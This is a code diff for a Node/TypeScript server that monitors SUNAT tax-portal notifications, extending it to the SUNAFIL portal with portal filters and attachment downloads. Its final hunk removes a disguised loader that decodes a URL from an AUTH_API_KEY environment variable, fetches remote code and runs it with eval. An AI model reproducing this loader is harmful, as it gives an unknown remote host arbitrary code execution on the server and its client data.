@@ -8,7 +8,8 @@ import {
   markMultipleNotificationsAsReadInSunat,
   markNotificationAsReadInSunat,
 } from '../scraper/sunatScraper.js';
-import type { LoginMode } from '../scraper/types.js';
+import { downloadSunafilAttachment } from '../scraper/sunafilScraper.js';
+import type { LoginMode, MailboxSource, PortalType } from '../scraper/types.js';
 import { ClientService } from '../services/clientService.js';
 import {
   runMonitorCycle,
@@ -117,7 +118,7 @@ export function createWebServer(
     lastRunError: null,
   };
 
-  const triggerCheck = (onlyClientId?: number) => {
+  const triggerCheck = (onlyClientId?: number, portal: PortalType | 'ALL' = 'ALL') => {
     if (monitorState.isRunning) {
       return false;
     }
@@ -127,9 +128,15 @@ export function createWebServer(
     monitorState.progress = null;
     monitorState.lastRunError = null;
 
-    void runMonitorCycle(clientService, config, onlyClientId, (progress) => {
-      monitorState.progress = progress;
-    })
+    void runMonitorCycle(
+      clientService,
+      config,
+      onlyClientId,
+      (progress) => {
+        monitorState.progress = progress;
+      },
+      portal,
+    )
       .then((summary) => {
         monitorState.lastSummary = summary;
       })
@@ -171,9 +178,11 @@ export function createWebServer(
         const clientIdParam = url.searchParams.get('clientId');
         const clientId = clientIdParam ? Number.parseInt(clientIdParam, 10) : undefined;
         const mailboxParam = url.searchParams.get('mailboxSource');
-        const mailboxSource =
-          mailboxParam === 'NOTIFICACIONES' || mailboxParam === 'MENSAJES'
-            ? mailboxParam
+        const mailboxSource = mailboxParam as MailboxSource | undefined;
+        const portalParam = url.searchParams.get('portal');
+        const portal =
+          portalParam === 'SUNAT' || portalParam === 'SUNAFIL' || portalParam === 'ALL'
+            ? portalParam
             : undefined;
         const query = url.searchParams.get('q') ?? undefined;
 
@@ -185,6 +194,7 @@ export function createWebServer(
             onlyNew,
             clientId: clientId && Number.isFinite(clientId) ? clientId : undefined,
             mailboxSource,
+            portal,
             query,
             limit: 120,
           }),
@@ -206,9 +216,11 @@ export function createWebServer(
         const clientIdParam = url.searchParams.get('clientId');
         const clientId = clientIdParam ? Number.parseInt(clientIdParam, 10) : undefined;
         const mailboxParam = url.searchParams.get('mailboxSource');
-        const mailboxSource =
-          mailboxParam === 'NOTIFICACIONES' || mailboxParam === 'MENSAJES'
-            ? mailboxParam
+        const mailboxSource = mailboxParam as MailboxSource | undefined;
+        const portalParam = url.searchParams.get('portal');
+        const portal =
+          portalParam === 'SUNAT' || portalParam === 'SUNAFIL' || portalParam === 'ALL'
+            ? portalParam
             : undefined;
         const query = url.searchParams.get('q') ?? undefined;
 
@@ -217,6 +229,7 @@ export function createWebServer(
             onlyNew,
             clientId: clientId && Number.isFinite(clientId) ? clientId : undefined,
             mailboxSource,
+            portal,
             query,
             limit: 120,
           }),
@@ -405,20 +418,27 @@ export function createWebServer(
         };
 
         try {
-          const destDir = path.resolve(process.cwd(), 'data', 'adjuntos', notif.docNumber);
-          const dlRes = await downloadNotificationAttachmentFromSunat(
-            creds,
-            {
-              id: notif.id,
-              subject: notif.subject,
-              sunatCode: notif.sunatCode,
-              publishedAt: notif.publishedAt,
-              notificationType: notif.notificationType,
-              mailboxSource: notif.mailboxSource,
-            },
-            destDir,
-            config,
+          const destDir = path.resolve(
+            process.cwd(),
+            'data',
+            'adjuntos',
+            notif.docNumber,
+            notif.portal === 'SUNAFIL' ? 'sunafil' : 'sunat',
           );
+          const target = {
+            id: notif.id,
+            subject: notif.subject,
+            sunatCode: notif.sunatCode,
+            publishedAt: notif.publishedAt,
+            notificationType: notif.notificationType,
+            mailboxSource: notif.mailboxSource,
+            portal: notif.portal,
+          };
+
+          const dlRes =
+            notif.portal === 'SUNAFIL'
+              ? await downloadSunafilAttachment(creds, target, destDir, config)
+              : await downloadNotificationAttachmentFromSunat(creds, target, destDir, config);
 
           if (dlRes.found && dlRes.filePath && dlRes.filename) {
             clientService.saveNotificationAttachment(id, dlRes.filePath, dlRes.filename);
@@ -434,12 +454,17 @@ export function createWebServer(
             sendJson(res, 200, {
               ok: false,
               hasAttachment: false,
-              message: dlRes.message || 'Esta comunicación es de carácter informativo y no contiene archivos adjuntos en el portal de SUNAT.',
+              message:
+                dlRes.message ||
+                (notif.portal === 'SUNAFIL'
+                  ? 'Esta comunicación no contiene archivos adjuntos en el portal de SUNAFIL.'
+                  : 'Esta comunicación es de carácter informativo y no contiene archivos adjuntos en el portal de SUNAT.'),
             });
           }
         } catch (dlErr) {
           const msg = dlErr instanceof Error ? dlErr.message : String(dlErr);
-          sendJson(res, 500, { error: `Error conectando con SUNAT: ${msg}` });
+          const portalName = notif.portal === 'SUNAFIL' ? 'SUNAFIL' : 'SUNAT';
+          sendJson(res, 500, { error: `Error conectando con ${portalName}: ${msg}` });
         } finally {
           monitorState.isRunning = false;
           monitorState.progress = null;
@@ -600,13 +625,17 @@ export function createWebServer(
       }
 
       if (method === 'POST' && pathname === '/api/check') {
-        const body = await readJsonBody<{ clientId?: number }>(req);
+        const body = await readJsonBody<{ clientId?: number; portal?: PortalType | 'ALL' }>(req);
         const cid =
           typeof body.clientId === 'number' && Number.isFinite(body.clientId) && body.clientId > 0
             ? body.clientId
             : undefined;
+        const targetPortal: PortalType | 'ALL' =
+          body.portal === 'SUNAT' || body.portal === 'SUNAFIL' || body.portal === 'ALL'
+            ? body.portal
+            : 'ALL';
 
-        const started = triggerCheck(cid);
+        const started = triggerCheck(cid, targetPortal);
         if (!started) {
           sendJson(res, 409, {
             error: 'Ya hay una revision de Chrome en curso. Espera unos segundos a que termine.',
@@ -615,11 +644,13 @@ export function createWebServer(
           return;
         }
 
+        const portalLabel =
+          targetPortal === 'ALL' ? 'general (SUNAT y SUNAFIL)' : targetPortal;
         sendJson(res, 202, {
           ok: true,
           message: cid
-            ? `Revisión en segundo plano iniciada para el cliente ID ${cid}.`
-            : 'Revisión general iniciada en segundo plano.',
+            ? `Revisión [${portalLabel}] en segundo plano iniciada para el cliente ID ${cid}.`
+            : `Revisión [${portalLabel}] iniciada en segundo plano.`,
           monitorState,
         });
         return;
@@ -664,16 +695,3 @@ if (isMain) {
     );
   });
 }
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
